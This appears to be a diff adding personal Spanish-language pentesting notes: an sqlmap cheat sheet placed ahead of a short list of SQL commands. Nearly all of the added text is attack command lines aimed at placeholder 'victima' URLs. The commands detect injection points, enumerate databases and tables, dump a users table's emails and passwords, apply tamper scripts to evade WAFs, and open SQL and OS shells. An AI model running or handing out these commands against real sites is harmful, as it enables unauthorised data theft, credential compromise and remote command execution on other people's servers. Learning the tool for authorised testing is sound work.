@@ -1,3 +1,58 @@
+SQLMAP:
+--wizard = GUIADO
+MAN 
+:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+
+POST:
+sqlmap -u "http://victima.con/busqueda.php" --method POST --data "param1=FUZZ&param2=FUZZ" 
+
+*si es HTTPS,forzar la conexión SSL a 443 / tcp.  --force-ssl:443Host
+
+
+==========================================
+GET:
+sqlmap -u "http://web.com.co" --data="param1=parametro1&param2=parametro2" -p "param1" --dbs
+sqlmap -u "http://victima.con/busqueda.php?param=texto+a+buscar&param2=FUZZ" -p param2
+
+==========
+EJEM:
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" //vemos is es vulnerable
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --dbs  // sacaremoslas bbdd
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB --tables //usamos  elnombre de la bbd y le decimos sacar las tablas de la bbdd
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios --columns //le decimos que de la tabla susrio saque las columnas
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios -C id,name,email,passwd --dump  sacamos la informacion de la tabla las columnas que hay
+
+
+=========
+TAMPER=archivo python para camuflar los payloads para bypassear WAF. depende del tipo de bbdd
+lista de tampers::https://github.com/sqlmapproject/sqlmap/tree/master/tamper
+
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --tamper="nombredeltamper1,nombredeltamper2,nombredeltamper3,etc"
+
+==============
+TECNICAS:
+B: Boolean-based blind
+E: Error-based
+U: Union query-based
+S: Stacked queries
+T: Time-based blind
+Q: Inline queries
+
+--technique=BEUSTQ
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --technique=B
+============
+SHELL:
+Sql shell:
+sqlmap -u "http://victima.com/busqueda.php?param=FUZZ" --sql-query "SELECT 'id' from usuarios" 
+sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --sql-shell
+OS shell:
+sqlmap -u "http://victima.com/busqueda.php?param=FUZZ" --os-shell
+
+
+
+
+=============================
 COMANDOS SQL
 SELECT Utilizado para consultar registros de la base de datos que satisfagan un criterio determinado
 INSERT Utilizado para cargar lotes de datos en la base de datos en una única operación.
